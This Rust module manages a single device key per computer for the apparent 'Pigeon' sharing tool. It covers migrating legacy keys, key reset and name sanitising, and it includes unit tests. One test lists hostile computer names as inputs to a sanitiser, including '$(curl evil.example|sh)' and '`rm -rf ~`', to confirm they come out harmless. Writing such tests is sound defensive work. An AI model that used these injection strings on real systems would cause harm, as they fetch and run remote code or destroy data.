//! One device identity per OS user per computer, for both roles.
//!
//! `pigeon-agent` (sharing) and `pigeon` (fetching) use the same Ed25519 key,
//! stored once as `device-key` in the OS keystore, and the same device name
//! (`device.json` in the config dir). So a computer has one fingerprint
//! everywhere (PAIRING.md D9).
//!
//! **First run, two programs at once.** Creating or migrating the key happens
//! under an OS file lock (`device-key.lock`); a second process waits, then
//! reads the key the first one stored. Reading an existing key takes no lock.
//!
//! **Migration** from the per-role keys of earlier builds (`agent-key`,
//! `client-key`), done once, under the same lock:
//! - The agent key becomes the device key, so every device already paired
//!   with this computer's agent keeps working.
//! - If there was no agent key, the client key becomes the device key, so
//!   every agent this computer already paired with keeps working.
//! - If there were both, the agents remembered in `agents.json` were paired
//!   with the client key and only know that one. They are marked
//!   ([`PairedAgent::legacy_key`]) and `pigeon` keeps using the old client key
//!   for exactly those agents, until each is paired again or forgotten. Then
//!   the old client key is deleted.
//!
//! Keys are only deleted once the device key is stored and reads back
//! correctly, and only if they are identical to it (a copy) or no longer
//! needed by any remembered agent. Every step can be repeated: a crash at any
//! point leaves a state the next run finishes.

use std::{path::Path, time::Duration};

use anyhow::{Context, Result, bail};
use iroh::{EndpointId, SecretKey};
use serde::{Deserialize, Serialize};

use crate::{
    devices::{AGENTS_FILE, AgentList, FileLock, PairedAgent},
    fingerprint,
    keystore::{self, SecretStore},
};

/// This computer's key, used by both programs.
pub const DEVICE_KEY: &str = "device-key";
/// The agent's own key in builds before one-key-per-device.
pub const LEGACY_AGENT_KEY: &str = "agent-key";
/// The client's own key in builds before one-key-per-device.
pub const LEGACY_CLIENT_KEY: &str = "client-key";
/// Device name and migration state (not secret).
pub const DEVICE_FILE: &str = "device.json";

/// How long a second program waits for the first to create the key. Long,
/// because macOS may be showing a Keychain prompt to the first one.
const CREATE_WAIT: Duration = Duration::from_secs(120);
/// Longest device name, in characters.
pub const MAX_NAME: usize = 64;

/// Where this run's key came from.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Origin {
    /// `device-key` was already there.
    Existing,
    /// Nothing was there: a new key.
    Created,
    /// Migrated: the old agent key is now the device key.
    FromAgentKey,
    /// Migrated: the old client key (there was no agent key) is now the device key.
    FromClientKey,
}

/// This computer, as both programs see it.
pub struct Identity {
    pub key: SecretKey,
    pub name: String,
    pub origin: Origin,
    /// The old client key, while some remembered agent still needs it.
    pub legacy_client: Option<EndpointId>,
    /// Things worth telling the user once (migration steps, cleanups, warnings).
    pub notes: Vec<String>,
}

impl Identity {
    pub fn id(&self) -> EndpointId {
        self.key.public()
    }

    pub fn fingerprint(&self) -> String {
        fingerprint(&self.id())
    }

    /// `Name (fingerprint)`, safe to print.
    pub fn summary(&self) -> String {
        format!(
            "{} ({})",
            crate::display_safe(&self.name),
            self.fingerprint()
        )
    }

    /// What `whoami` prints (the same in both programs).
    pub fn whoami(&self, store: &dyn SecretStore, agents: &AgentList) -> String {
        let mut out = format!(
            "name:        {}\nfingerprint: {}\nid:          {}\nkey:         {}\nused by:     pigeon-agent (share) and pigeon (get): one key for this computer\n",
            crate::display_safe(&self.name),
            self.fingerprint(),
            self.id(),
            store.describe(),
        );
        if let Some(old) = self.legacy_client {
            let names: Vec<String> = agents
                .agents
                .iter()
                .filter(|a| a.legacy_key == Some(old))
                .map(|a| crate::display_safe(&a.name))
                .collect();
            out.push_str(&format!(
                "old key:     {} (from before one-key-per-device), still used to reach: {}\n             \
                 pair again with each (`pigeon-agent pair` there, `pigeon pair <LINK>` here) to drop it\n",
                fingerprint(&old),
                names.join(", ")
            ));
        }
        out
    }

    /// The key to dial `agent` with: the device key, or the old client key
    /// for an agent that was paired with it (and knows no other).
    pub fn key_for(&self, store: &dyn SecretStore, agent: &PairedAgent) -> Result<SecretKey> {
        let Some(old) = agent.legacy_key.filter(|old| *old != self.id()) else {
            return Ok(self.key.clone());
        };
        match keystore::read_key(store, LEGACY_CLIENT_KEY)? {
            Some(key) if key.public() == old => Ok(key),
            _ => bail!(
                "{} was paired with this computer's old client key {}, which is no longer \
                 stored here. Pair again: run `pigeon-agent pair` on that computer, then \
                 `pigeon pair <LINK>` here",
                crate::display_safe(&agent.name),
                fingerprint(&old)
            ),
        }
    }
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct DeviceFile {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    name: Option<String>,
    /// The old client key some remembered agents still need.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    legacy_client: Option<EndpointId>,
    /// Old keystore entries to delete once they are confirmed to be copies of
    /// the device key (set before the device key is written).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    cleanup: Vec<String>,
}

fn read_device_file(dir: &Path) -> Result<DeviceFile> {
    let path = dir.join(DEVICE_FILE);
    match std::fs::read(&path) {
        Ok(bytes) => serde_json::from_slice(&bytes)
            .with_context(|| format!("{} is damaged; fix or delete it", path.display())),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(DeviceFile::default()),
        Err(e) => Err(e).with_context(|| format!("could not read {}", path.display())),
    }
}

/// Locked read-modify-write of `device.json`.
fn update_device_file<T>(dir: &Path, f: impl FnOnce(&mut DeviceFile) -> T) -> Result<T> {
    let path = dir.join(DEVICE_FILE);
    let _lock = FileLock::acquire(&path)?;
    let mut file = read_device_file(dir)?;
    let out = f(&mut file);
    let mut json = serde_json::to_vec_pretty(&file)?;
    json.push(b'\n');
    crate::config::write_private(&path, &json)?;
    Ok(out)
}

fn create_lock(dir: &Path) -> Result<FileLock> {
    FileLock::acquire_for(
        &dir.join(DEVICE_KEY),
        CREATE_WAIT,
        "another Pigeon program is creating this computer's key",
    )
}

/// Loads this computer's identity from the config dir `dir` and `store`,
/// creating or migrating it on first use (see the module docs). `dir` must
/// exist ([`crate::config::Home`] creates it owner-only).
pub fn load(dir: &Path, store: &dyn SecretStore) -> Result<Identity> {
    let mut notes = Vec::new();
    let (key, origin) = match keystore::read_key(store, DEVICE_KEY)? {
        Some(key) => (key, Origin::Existing),
        None => {
            let _lock = create_lock(dir)?;
            match keystore::read_key(store, DEVICE_KEY)? {
                // Another program created it while we waited.
                Some(key) => (key, Origin::Existing),
                None => create_or_migrate(dir, store, &mut notes)?,
            }
        }
    };
    let legacy_client = match tidy(dir, store, &key, &mut notes) {
        Ok(legacy) => legacy,
        Err(e) => {
            notes.push(format!(
                "warning: could not tidy up old keys (nothing was lost): {e:#}"
            ));
            read_device_file(dir).ok().and_then(|f| f.legacy_client)
        }
    };
    let name = match read_device_file(dir)?.name {
        Some(name) => name,
        None => update_device_file(dir, |f| f.name.get_or_insert_with(default_name).clone())?,
    };
    Ok(Identity {
        key,
        name,
        origin,
        legacy_client,
        notes,
    })
}

/// Runs under the create lock, with no `device-key` in the store.
fn create_or_migrate(
    dir: &Path,
    store: &dyn SecretStore,
    notes: &mut Vec<String>,
) -> Result<(SecretKey, Origin)> {
    let agent = keystore::read_key(store, LEGACY_AGENT_KEY)?;
    let client = keystore::read_key(store, LEGACY_CLIENT_KEY)?;
    let (key, origin, from) = match (agent, &client) {
        (Some(a), _) => (a, Origin::FromAgentKey, Some(LEGACY_AGENT_KEY)),
        (None, Some(c)) => (c.clone(), Origin::FromClientKey, Some(LEGACY_CLIENT_KEY)),
        (None, None) => (SecretKey::generate(), Origin::Created, None),
    };
    let id = key.public();
    let legacy = client.map(|c| c.public()).filter(|c| *c != id);
    if let Some(old) = legacy {
        // Every agent remembered here was paired with the old client key.
        let marked = AgentList::update(&dir.join(AGENTS_FILE), |list| {
            let mut n = 0;
            for a in list.agents.iter_mut().filter(|a| a.legacy_key.is_none()) {
                a.legacy_key = Some(old);
                n += 1;
            }
            Ok(n)
        })?;
        if marked > 0 {
            notes.push(format!(
                "{marked} agent(s) remembered here were paired with this computer's old client \
                 key {}; Pigeon keeps using that key for them until you pair again \
                 (`pigeon whoami` lists them)",
                fingerprint(&old)
            ));
        }
    }
    update_device_file(dir, |f| {
        if legacy.is_some() {
            f.legacy_client = legacy;
        }
        if let Some(from) = from
            && !f.cleanup.iter().any(|c| c == from)
        {
            f.cleanup.push(from.to_string());
        }
    })?;
    keystore::write_key(store, DEVICE_KEY, &key)?;
    let fp = fingerprint(&id);
    notes.push(match origin {
        Origin::Created => format!("created this computer's key {fp} in {}", store.describe()),
        Origin::FromAgentKey => format!(
            "one key per computer: this computer now uses its agent key {fp} for sharing and \
             fetching (stored as `{DEVICE_KEY}` in {})",
            store.describe()
        ),
        Origin::FromClientKey => format!(
            "one key per computer: this computer now uses its client key {fp} for sharing and \
             fetching (stored as `{DEVICE_KEY}` in {})",
            store.describe()
        ),
        Origin::Existing => unreachable!(),
    });
    Ok((key, origin))
}

/// Finishes an earlier migration (idempotent). Returns the old client key if
/// a remembered agent still needs it.
fn tidy(
    dir: &Path,
    store: &dyn SecretStore,
    key: &SecretKey,
    notes: &mut Vec<String>,
) -> Result<Option<EndpointId>> {
    let file = read_device_file(dir)?;
    // Old entries that were copied to `device-key`: delete them only if they
    // really are the same key (the device key is stored and read back by now).
    let mut done = Vec::new();
    for name in &file.cleanup {
        match keystore::read_key(store, name)? {
            Some(old) if old.public() != key.public() => notes.push(format!(
                "note: kept `{name}` ({}): it is not this computer's key",
                fingerprint(&old.public())
            )),
            Some(_) => store.delete(name)?,
            None => {}
        }
        done.push(name.clone());
    }
    if !done.is_empty() {
        update_device_file(dir, |f| f.cleanup.retain(|c| !done.contains(c)))?;
    }

    let Some(old) = file.legacy_client else {
        return Ok(None);
    };
    let agents = AgentList::load(&dir.join(AGENTS_FILE))?;
    if agents.agents.iter().any(|a| a.legacy_key == Some(old)) {
        return Ok(Some(old));
    }
    // No remembered agent needs it any more (each was paired again or
    // forgotten). Only that exact key is deleted.
    if keystore::read_key(store, LEGACY_CLIENT_KEY)?.is_some_and(|c| c.public() == old) {
        store.delete(LEGACY_CLIENT_KEY)?;
        notes.push(format!(
            "removed the old client key {}: no paired agent needs it any more",
            fingerprint(&old)
        ));
    }
    update_device_file(dir, |f| {
        if f.legacy_client == Some(old) {
            f.legacy_client = None;
        }
    })?;
    Ok(None)
}

/// What [`reset`] did.
#[derive(Debug)]
pub struct Reset {
    /// The new device key.
    pub key: SecretKey,
    /// Every key this computer had before (device key, old per-role keys),
    /// all retired now: the other side should revoke each of them.
    pub retired: Vec<EndpointId>,
    /// Every remembered agent: all knew one of the retired keys, so each
    /// must be paired again.
    pub agents: Vec<PairedAgent>,
}

/// `pigeon-agent reset` (W-12): a new device key for this computer, for
/// both roles. Every old key is retired, not just the device key: the old
/// per-role `agent-key` / `client-key` entries are deleted too, the
/// migration state in `device.json` is cleared, and the `legacy_key` marks
/// in `agents.json` are removed, so nothing keeps dialling with an old key.
/// The caller asked for exactly this (`--yes`) and is told which keys were
/// retired and which agents need a new pairing.
pub fn reset(dir: &Path, store: &dyn SecretStore) -> Result<Reset> {
    let _lock = create_lock(dir)?;
    let mut retired = Vec::new();
    for name in [DEVICE_KEY, LEGACY_AGENT_KEY, LEGACY_CLIENT_KEY] {
        // A damaged entry is replaced or deleted anyway: that is what reset is for.
        if let Ok(Some(old)) = keystore::read_key(store, name)
            && !retired.contains(&old.public())
        {
            retired.push(old.public());
        }
    }
    let key = SecretKey::generate();
    keystore::write_key(store, DEVICE_KEY, &key)?;
    // Only once the new key is stored and read back.
    store.delete(LEGACY_AGENT_KEY)?;
    store.delete(LEGACY_CLIENT_KEY)?;
    update_device_file(dir, |f| {
        f.legacy_client = None;
        f.cleanup.clear();
    })?;
    let agents = AgentList::update(&dir.join(AGENTS_FILE), |list| {
        for a in &mut list.agents {
            a.legacy_key = None;
        }
        Ok(list.agents.clone())
    })?;
    Ok(Reset {
        key,
        retired,
        agents,
    })
}

/// Renames this computer (both programs show the new name).
pub fn set_name(dir: &Path, name: &str) -> Result<String> {
    let name = clean_name(name).context("a name needs at least one visible character")?;
    update_device_file(dir, |f| f.name = Some(name.clone()))?;
    Ok(name)
}

/// A name without control or bidi characters, trimmed, at most
/// [`MAX_NAME`] characters; `None` if nothing is left.
pub fn clean_name(raw: &str) -> Option<String> {
    let kept: String = raw
        .chars()
        .filter(|c| {
            let s = c.to_string();
            crate::display_safe(&s) == s
        })
        .take(MAX_NAME)
        .collect();
    let kept = kept.trim();
    (!kept.is_empty()).then(|| kept.to_string())
}

/// The name as it may appear inside double quotes in a command we suggest
/// typing or pasting on *another* computer (W-14): `pigeon-agent pair`
/// prints `pigeon pair <LINK> --name "<this>"`. The name can come from the
/// OS (on a managed work Mac employer IT sets it), so anything a shell could
/// act on inside double quotes (`$`, backticks, `"`, `\`, `!`, `%`, the
/// curly double quotes PowerShell also accepts, ...) is dropped: only
/// letters, digits, spaces and `. _ - '` and `’` are kept, and no leading
/// `-` (it would look like an option). `None` if nothing is left; then the
/// hint has no `--name`.
pub fn hint_name(name: &str) -> Option<String> {
    let kept: String = name
        .chars()
        .filter(|c| c.is_alphanumeric() || " ._-'’".contains(*c))
        .collect();
    let kept = kept.split_whitespace().collect::<Vec<_>>().join(" ");
    let kept = kept.trim_start_matches(['-', ' ']);
    (!kept.is_empty()).then(|| kept.to_string())
}

/// The OS's name for this computer, cleaned, or "My computer".
pub fn default_name() -> String {
    os_name()
        .and_then(|n| clean_name(&n))
        .unwrap_or_else(|| "My computer".into())
}

#[cfg(windows)]
fn os_name() -> Option<String> {
    std::env::var("COMPUTERNAME").ok()
}

#[cfg(target_os = "macos")]
fn os_name() -> Option<String> {
    // The name from System Settings > General > Sharing (absolute path: no PATH lookup).
    let out = std::process::Command::new("/usr/sbin/scutil")
        .args(["--get", "ComputerName"])
        .output()
        .ok()?;
    out.status
        .success()
        .then(|| String::from_utf8_lossy(&out.stdout).into_owned())
}

#[cfg(not(any(windows, target_os = "macos")))]
fn os_name() -> Option<String> {
    std::fs::read_to_string("/proc/sys/kernel/hostname")
        .or_else(|_| std::fs::read_to_string("/etc/hostname"))
        .ok()
}

/// Helpers shared by the unit tests here and in `keystore.rs`.
#[cfg(test)]
pub(crate) mod tests_support {
    use std::path::Path;

    use iroh::SecretKey;

    use crate::devices::{AGENTS_FILE, AgentList, PairedAgent};

    /// Adds an agent (key `[seed; 32]`) to `agents.json`, as `pigeon pair` did.
    pub fn remember_agent(dir: &Path, seed: u8) -> PairedAgent {
        let agent = PairedAgent {
            id: SecretKey::from_bytes(&[seed; 32]).public(),
            name: format!("agent {seed}"),
            relay_url: None,
            paired_at: 1,
            legacy_key: None,
        };
        AgentList::update(&dir.join(AGENTS_FILE), |l| {
            l.upsert(agent.clone());
            Ok(())
        })
        .unwrap();
        agent
    }
}

#[cfg(test)]
mod tests {
    use std::sync::Arc;

    use super::{tests_support::remember_agent, *};
    use crate::keystore::{FileStore, MemoryStore, read_key, write_key};

    fn agents(dir: &Path) -> AgentList {
        AgentList::load(&dir.join(AGENTS_FILE)).unwrap()
    }

    #[test]
    fn fresh_install_creates_one_key_and_a_name() {
        let dir = tempfile::tempdir().unwrap();
        let store = MemoryStore::default();
        let me = load(dir.path(), &store).unwrap();
        assert_eq!(me.origin, Origin::Created);
        assert!(!me.name.is_empty());
        assert!(me.legacy_client.is_none());
        let again = load(dir.path(), &store).unwrap();
        assert_eq!(again.origin, Origin::Existing);
        assert_eq!(again.id(), me.id());
        assert_eq!(again.name, me.name);
        assert!(again.notes.is_empty(), "{:?}", again.notes);
        assert!(read_key(&store, LEGACY_AGENT_KEY).unwrap().is_none());
        assert!(read_key(&store, LEGACY_CLIENT_KEY).unwrap().is_none());
    }

    /// Two programs starting at the same time on a fresh install (threads
    /// here, each with its own store handle on the same files) end up with
    /// one key: the lock serialises creation and the others re-read.
    #[test]
    fn concurrent_first_run_creates_one_key() {
        for _ in 0..5 {
            let dir = tempfile::tempdir().unwrap();
            let home = dir.path().to_path_buf();
            let barrier = Arc::new(std::sync::Barrier::new(8));
            let threads: Vec<_> = (0..8)
                .map(|_| {
                    let home = home.clone();
                    let barrier = barrier.clone();
                    std::thread::spawn(move || {
                        let store = FileStore::new(home.join("secrets"));
                        barrier.wait();
                        let me = load(&home, &store).unwrap();
                        (me.id(), me.origin, me.name)
                    })
                })
                .collect();
            let results: Vec<_> = threads.into_iter().map(|t| t.join().unwrap()).collect();
            let first = results[0].0;
            assert!(results.iter().all(|r| r.0 == first), "{results:?}");
            assert!(results.iter().all(|r| r.2 == results[0].2), "one name");
            let created = results.iter().filter(|r| r.1 == Origin::Created).count();
            assert_eq!(created, 1, "{results:?}");
            let store = FileStore::new(home.join("secrets"));
            assert_eq!(
                read_key(&store, DEVICE_KEY).unwrap().unwrap().public(),
                first
            );
        }
    }

    /// The owner's machines after Day 5: an agent key and a client key, and
    /// a remembered agent paired with the client key.
    #[test]
    fn two_key_install_keeps_agent_key_and_old_client_key_for_old_agents() {
        let dir = tempfile::tempdir().unwrap();
        let store = MemoryStore::default();
        let agent_key = SecretKey::generate();
        let client_key = SecretKey::generate();
        write_key(&store, LEGACY_AGENT_KEY, &agent_key).unwrap();
        write_key(&store, LEGACY_CLIENT_KEY, &client_key).unwrap();
        let office = remember_agent(dir.path(), 1);

        let me = load(dir.path(), &store).unwrap();
        assert_eq!(me.origin, Origin::FromAgentKey);
        assert_eq!(me.id(), agent_key.public(), "agent pairings keep working");
        assert_eq!(me.legacy_client, Some(client_key.public()));
        assert_eq!(me.notes.len(), 2, "{:?}", me.notes);
        // The copied agent entry is gone, the client key is kept.
        assert!(read_key(&store, LEGACY_AGENT_KEY).unwrap().is_none());
        assert!(read_key(&store, LEGACY_CLIENT_KEY).unwrap().is_some());
        let office = agents(dir.path()).pick(Some(&office.name)).unwrap().clone();
        assert_eq!(office.legacy_key, Some(client_key.public()));
        assert_eq!(
            me.key_for(&store, &office).unwrap().public(),
            client_key.public()
        );
        let whoami = me.whoami(&store, &agents(dir.path()));
        assert!(whoami.contains(&me.fingerprint()), "{whoami}");
        assert!(
            whoami.contains(&fingerprint(&client_key.public())),
            "{whoami}"
        );

        // Idempotent: a second run changes nothing and says nothing.
        let again = load(dir.path(), &store).unwrap();
        assert_eq!(again.origin, Origin::Existing);
        assert_eq!(again.id(), me.id());
        assert_eq!(again.legacy_client, me.legacy_client);
        assert!(again.notes.is_empty(), "{:?}", again.notes);

        // A new agent paired after the migration uses the device key.
        let new = remember_agent(dir.path(), 2);
        assert_eq!(me.key_for(&store, &new).unwrap().public(), me.id());

        // Pairing the old agent again (upsert without legacy_key) drops the
        // need for the old key; the next start deletes exactly that key.
        AgentList::update(&dir.path().join(AGENTS_FILE), |l| {
            l.upsert(PairedAgent {
                legacy_key: None,
                ..office.clone()
            });
            Ok(())
        })
        .unwrap();
        let after = load(dir.path(), &store).unwrap();
        assert_eq!(after.legacy_client, None);
        assert!(read_key(&store, LEGACY_CLIENT_KEY).unwrap().is_none());
        assert!(
            after
                .notes
                .iter()
                .any(|n| n.contains("removed the old client key"))
        );
        assert_eq!(after.id(), agent_key.public());
    }

    #[test]
    fn client_only_install_keeps_the_client_key() {
        let dir = tempfile::tempdir().unwrap();
        let store = MemoryStore::default();
        let client_key = SecretKey::generate();
        write_key(&store, LEGACY_CLIENT_KEY, &client_key).unwrap();
        remember_agent(dir.path(), 1);
        let me = load(dir.path(), &store).unwrap();
        assert_eq!(me.origin, Origin::FromClientKey);
        assert_eq!(me.id(), client_key.public());
        assert_eq!(me.legacy_client, None);
        assert!(read_key(&store, LEGACY_CLIENT_KEY).unwrap().is_none());
        let office = agents(dir.path()).agents[0].clone();
        assert_eq!(office.legacy_key, None);
        assert_eq!(me.key_for(&store, &office).unwrap().public(), me.id());
    }

    #[test]
    fn agent_only_install_keeps_the_agent_key() {
        let dir = tempfile::tempdir().unwrap();
        let store = MemoryStore::default();
        let agent_key = SecretKey::generate();
        write_key(&store, LEGACY_AGENT_KEY, &agent_key).unwrap();
        let me = load(dir.path(), &store).unwrap();
        assert_eq!(me.origin, Origin::FromAgentKey);
        assert_eq!(me.id(), agent_key.public());
        assert!(read_key(&store, LEGACY_AGENT_KEY).unwrap().is_none());
    }

    /// A crash after `device-key` was written but before the old entry was
    /// deleted: the next (fast-path) run finishes the job. An entry that is
    /// *not* the device key is never deleted.
    #[test]
    fn interrupted_migration_is_finished_and_strangers_are_kept() {
        let dir = tempfile::tempdir().unwrap();
        let store = MemoryStore::default();
        let key = SecretKey::generate();
        write_key(&store, DEVICE_KEY, &key).unwrap();
        write_key(&store, LEGACY_AGENT_KEY, &key).unwrap();
        let stranger = SecretKey::generate();
        write_key(&store, LEGACY_CLIENT_KEY, &stranger).unwrap();
        update_device_file(dir.path(), |f| {
            f.cleanup = vec![LEGACY_AGENT_KEY.into(), LEGACY_CLIENT_KEY.into()];
        })
        .unwrap();
        let me = load(dir.path(), &store).unwrap();
        assert_eq!(me.origin, Origin::Existing);
        assert!(read_key(&store, LEGACY_AGENT_KEY).unwrap().is_none());
        assert_eq!(
            read_key(&store, LEGACY_CLIENT_KEY)
                .unwrap()
                .unwrap()
                .public(),
            stranger.public(),
            "a key that is not the device key must never be deleted"
        );
        assert!(read_device_file(dir.path()).unwrap().cleanup.is_empty());
    }

    /// Migration under contention: 8 programs at once on a two-key install
    /// all get the agent key; the remembered agent is marked once.
    #[test]
    fn concurrent_migration_is_done_once() {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path().to_path_buf();
        let agent_key = SecretKey::generate();
        let client_key = SecretKey::generate();
        {
            let store = FileStore::new(home.join("secrets"));
            write_key(&store, LEGACY_AGENT_KEY, &agent_key).unwrap();
            write_key(&store, LEGACY_CLIENT_KEY, &client_key).unwrap();
        }
        remember_agent(&home, 1);
        let barrier = Arc::new(std::sync::Barrier::new(8));
        let threads: Vec<_> = (0..8)
            .map(|_| {
                let home = home.clone();
                let barrier = barrier.clone();
                std::thread::spawn(move || {
                    let store = FileStore::new(home.join("secrets"));
                    barrier.wait();
                    let me = load(&home, &store).unwrap();
                    (me.id(), me.origin)
                })
            })
            .collect();
        let results: Vec<_> = threads.into_iter().map(|t| t.join().unwrap()).collect();
        assert!(results.iter().all(|r| r.0 == agent_key.public()));
        let migrated = results
            .iter()
            .filter(|r| r.1 == Origin::FromAgentKey)
            .count();
        assert_eq!(migrated, 1, "{results:?}");
        let list = agents(&home);
        assert_eq!(list.agents[0].legacy_key, Some(client_key.public()));
    }

    #[test]
    fn missing_old_client_key_gives_a_re_pair_hint() {
        let dir = tempfile::tempdir().unwrap();
        let store = MemoryStore::default();
        let me = load(dir.path(), &store).unwrap();
        let mut agent = remember_agent(dir.path(), 3);
        agent.legacy_key = Some(SecretKey::generate().public());
        let err = format!("{:#}", me.key_for(&store, &agent).unwrap_err());
        assert!(err.contains("Pair again"), "{err}");
    }

    #[test]
    fn reset_replaces_the_key_for_both_roles() {
        let dir = tempfile::tempdir().unwrap();
        let store = MemoryStore::default();
        let before = load(dir.path(), &store).unwrap();
        let new = reset(dir.path(), &store).unwrap();
        assert_ne!(new.key.public(), before.id());
        assert_eq!(new.retired, vec![before.id()]);
        assert!(new.agents.is_empty());
        let after = load(dir.path(), &store).unwrap();
        assert_eq!(after.id(), new.key.public());
        assert_eq!(after.name, before.name, "the name stays");
    }

    /// W-12: on a migrated two-key install, reset retires *every* old key
    /// (the device key and the old client key), clears the migration state
    /// and every `legacy_key` mark, and reports all remembered agents. An
    /// interrupted-migration leftover (`agent-key` in `cleanup`) goes too.
    #[test]
    fn reset_retires_the_old_client_key_and_all_marks() {
        let dir = tempfile::tempdir().unwrap();
        let store = MemoryStore::default();
        let agent_key = SecretKey::generate();
        let client_key = SecretKey::generate();
        write_key(&store, LEGACY_AGENT_KEY, &agent_key).unwrap();
        write_key(&store, LEGACY_CLIENT_KEY, &client_key).unwrap();
        let office = remember_agent(dir.path(), 1);
        let me = load(dir.path(), &store).unwrap();
        assert_eq!(me.legacy_client, Some(client_key.public()));
        let new_agent = remember_agent(dir.path(), 2);
        // A leftover copy of the old device key from a crash mid-migration.
        write_key(&store, LEGACY_AGENT_KEY, &agent_key).unwrap();
        update_device_file(dir.path(), |f| f.cleanup = vec![LEGACY_AGENT_KEY.into()]).unwrap();

        let done = reset(dir.path(), &store).unwrap();
        assert_eq!(done.retired, vec![agent_key.public(), client_key.public()]);
        let names: Vec<_> = done.agents.iter().map(|a| a.name.clone()).collect();
        assert_eq!(names, [office.name.clone(), new_agent.name.clone()]);
        assert!(read_key(&store, LEGACY_AGENT_KEY).unwrap().is_none());
        assert!(read_key(&store, LEGACY_CLIENT_KEY).unwrap().is_none());
        let file = read_device_file(dir.path()).unwrap();
        assert!(file.legacy_client.is_none() && file.cleanup.is_empty());
        assert!(
            agents(dir.path())
                .agents
                .iter()
                .all(|a| a.legacy_key.is_none())
        );

        // Nothing dials with an old key any more, and nothing is "kept".
        let after = load(dir.path(), &store).unwrap();
        assert_eq!(after.id(), done.key.public());
        assert!(after.legacy_client.is_none());
        assert!(after.notes.is_empty(), "{:?}", after.notes);
        for a in &agents(dir.path()).agents {
            assert_eq!(after.key_for(&store, a).unwrap().public(), after.id());
        }
    }

    /// W-14: hostile computer names never reach a suggested command line
    /// as something a shell (bash, zsh, PowerShell, cmd) would run.
    #[test]
    fn hint_names_are_shell_inert() {
        for (hostile, want) in [
            ("$(curl evil.example|sh)", Some("curl evil.examplesh")),
            ("`rm -rf ~`", Some("rm -rf")),
            ("a\"; calc; \"b", Some("a calc b")),
            ("x\\\" $env:USERPROFILE", Some("x envUSERPROFILE")),
            ("%PATH% !! ${IFS}", Some("PATH IFS")),
            ("“smart” quotes", Some("smart quotes")),
            ("--help", Some("help")),
            ("$()`\"", None),
        ] {
            let got = hint_name(hostile);
            assert_eq!(got.as_deref(), want, "{hostile:?}");
            if let Some(s) = got {
                assert!(
                    s.chars()
                        .all(|c| c.is_alphanumeric() || " ._-'’".contains(c)),
                    "{s:?}"
                );
            }
        }
        for normal in [
            "Office Mac",
            "Ali’s MacBook Pro",
            "DESKTOP-7Q2K",
            "Отчёт ПК",
            "o'brien.local",
        ] {
            assert_eq!(hint_name(normal).as_deref(), Some(normal));
        }
    }

    #[test]
    fn names_are_cleaned_and_renaming_sticks() {
        assert_eq!(clean_name("  Office Mac \n").as_deref(), Some("Office Mac"));
        assert_eq!(
            clean_name("a\u{1b}[2Jb\u{202e}c").as_deref(),
            Some("a[2Jbc")
        );
        assert_eq!(clean_name(" \t\u{200b} "), None);
        assert_eq!(
            clean_name(&"x".repeat(200)).unwrap().chars().count(),
            MAX_NAME
        );
        assert_eq!(
            clean_name("Ali’s MacBook Pro").as_deref(),
            Some("Ali’s MacBook Pro")
        );
        let dir = tempfile::tempdir().unwrap();
        let store = MemoryStore::default();
        load(dir.path(), &store).unwrap();
        set_name(dir.path(), "Home PC").unwrap();
        assert_eq!(load(dir.path(), &store).unwrap().name, "Home PC");
        assert!(set_name(dir.path(), "\u{7}").is_err());
        assert!(!default_name().is_empty());
    }
}
